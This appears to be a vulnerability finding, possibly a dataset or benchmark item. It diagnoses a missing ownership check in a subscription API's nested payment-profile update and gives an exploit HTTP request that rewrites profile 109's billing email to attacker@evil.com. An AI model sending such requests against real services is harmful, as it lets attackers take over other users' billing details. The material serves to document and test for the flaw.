diagnosis: The nested update extracts profile_id from the payload and updates that PaymentProfile row directly via ORM without validating that the payment profile is associated with instance or the requesting user's account, allowing arbitrary modification of billing profiles.
exploit_request:
PUT /api/subscriptions/current/ HTTP/1.1
Host: api.example.com
Authorization: Bearer <attacker_token>
Content-Type: application/json

{"plan_name": "Enterprise", "tier": "gold", "payment_profile": {"id": 109, "billing_email": "attacker@evil.com"}}
